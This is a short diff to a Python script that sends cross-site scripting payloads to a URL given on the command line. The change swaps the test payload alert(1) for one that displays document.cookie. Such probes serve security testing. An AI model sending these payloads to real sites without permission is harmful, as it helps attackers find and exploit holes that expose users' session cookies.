@@ -2,7 +2,7 @@ import requests
 import sys
 
 url = sys.argv[1]
-payloads = ['<script>alert(1);</script>']
+payloads = ['<script>alert(document.cookie);</script>']
 
 for payload in payloads:
     req = requests.post(url + payload)
